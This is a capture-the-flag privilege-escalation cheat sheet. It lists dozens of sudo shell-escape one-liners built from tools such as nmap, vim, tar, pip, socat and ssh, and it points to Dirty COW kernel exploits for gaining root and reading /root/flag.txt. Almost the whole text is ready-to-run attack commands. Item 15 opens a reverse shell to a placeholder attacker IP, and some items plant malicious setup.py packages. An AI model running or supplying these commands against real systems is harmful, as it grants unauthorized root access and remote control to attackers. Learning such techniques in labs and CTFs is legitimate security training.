# Privilege Escalation Techniques

## Commands List

1. `nmap --interactive; !sh`
2. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
3. `sudo awk 'BEGIN {system("/bin/sh")}'`
4. `sudo find /home -exec /bin/bash \;`
5. `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
6. `sudo less /etc/hosts` then `!/bin/bash`
7. `sudo bash`
8. `sudo perl -e 'exec "/bin/bash";'`
9. `sudo python -c 'import pty; pty.spawn("/bin/bash")'`
10. `sudo man man`
    `!/bin/bash`
11. `sudo vi`
    `:!/bin/bash`
12. `sudo vim -c '!sh'`
13. `sudo env /bin/bash`
14. `sudo ftp`
    `!/bin/bash`
15. On Attacker Machine run:
    ```sh
    socat file:`tty`,raw,echo=0 tcp-listen:1234
    ```
    Then on Target Machine run:
    ```sh
    sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:1234
    ```
16. `sudo /bin/bash -p`
17. `sudo -s`
18. `sudo php -r "system('/bin/sh');"`
19. `sudo strace -o /dev/null /bin/sh`
20. `sudo xargs -a /dev/null sh`
21. `sudo timeout --foreground 7d /bin/sh`
22. `sudo expect -c 'spawn /bin/sh; interact'`
23. `sudo ionice /bin/sh`
24. `sudo /usr/bin/time /bin/sh`
25. `sudo taskset 1 /bin/sh`
26. `sudo flock -u / /bin/sh`
27. `sudo setarch $(arch) /bin/sh`
28. `sudo stdbuf -i0 /bin/sh`
29. `sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`
30. `sudo pg /etc/profile`
    `!/bin/sh`
31. `sudo nice /bin/sh`
32. `sudo gdb -nx -ex '!sh' -ex quit`
33. `sudo dmsetup ls --exec '/bin/sh -s'`
34. `sudo start-stop-daemon -n $RANDOM -S -x /bin/sh`
35. `sudo logsave /dev/null /bin/sh -i`
36. `sudo sed -n '1e exec sh 1>&0' /etc/hosts`
37. `sudo mount -o bind /bin/sh /bin/mount`
    `sudo mount`
38. `sudo dash`
39. `sudo ksh`
40. `sudo ip netns add foo`
    ```sh
    sudo ip netns exec foo /bin/sh
    sudo ip netns delete foo
    ```
41. `TERM= sudo more /etc/profile`
    `!/bin/sh`
42. `sudo zsh`
43. `sudo less /etc/profile`
    `!/bin/sh`
44. `sudo busybox sh`
45. `sudo run-parts --new-session --regex '^sh$' /bin`
46. `sudo unshare /bin/sh`
47. `sudo ltrace -L /bin/sh`
48. `sudo lua -e 'os.execute("/bin/sh")'`
49. `sudo mawk 'BEGIN {system("/bin/sh")}'`
50. `git help config`
    `!/bin/sh`
51. `sudo service ../../bin/sh`
52. `sudo irb`
    `exec '/bin/bash'`
53. `sudo pic -U`
    ```sh
    .PS
    sh X sh X
    ```
54. `sudo puppet apply -e "exec { '/bin/sh -c \"exec sh -i <$(tty) >$(tty) 2>$(tty)\"': }"`
55. `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
56. `sudo rlwrap /bin/sh`
57. `sudo ruby -e 'exec "/bin/sh"'`
58. `sudo tclsh`
    ```tcl
    exec /bin/sh <@stdin >@stdout 2>@stderr
    ```
59. ```sh
    TF=$(mktemp -u) && sudo zip $TF /etc/hosts -T -TT 'sh #'
    sudo rm $TF
    ```
60. `sudo csh`
61. ```sh
    TF=$(mktemp -d)
    echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
    sudo easy_install $TF
    ```
62. `sudo emacs -Q -nw --eval '(term "/bin/sh")'`
63. `sudo tmux`
64. `sudo screen`
65. `sudo script -q /dev/null`
66. ```sh
    TF=$(mktemp)
    echo 'sh 0<&2 1>&2' > $TF
    chmod +x "$TF"
    sudo scp -S $TF x y:
    ```
67. `sudo rvim -c ':py import os; os.execl("sh", "sh", "-c", "reset; exec sh")'`
68. ```sh
    TF=$(mktemp -d)
    echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
    sudo pip install $TF
    ```
69. `sudo ash`
70. `sudo gawk 'BEGIN {system("/bin/sh")}'`
71. `sudo nawk 'BEGIN {system("/bin/sh")}'`
72. `vi`
    `:set shell=/bin/bash:shell`
73. Kernel Exploits:

    Use Linux Exploit Suggester which suggests Dirty COW vulnerability - <https://github.com/mzet-/linux-exploit-suggester>
    
    Then Use Dirty Cow exploit to get root — <https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs>

The flag is at location `/root/flag.txt`. Read and submit it when you are root :smiley:

## Useful Resources used while solving this:
- <https://github.com/t0thkr1s/gtfo>
- <https://gtfobins.github.io/>
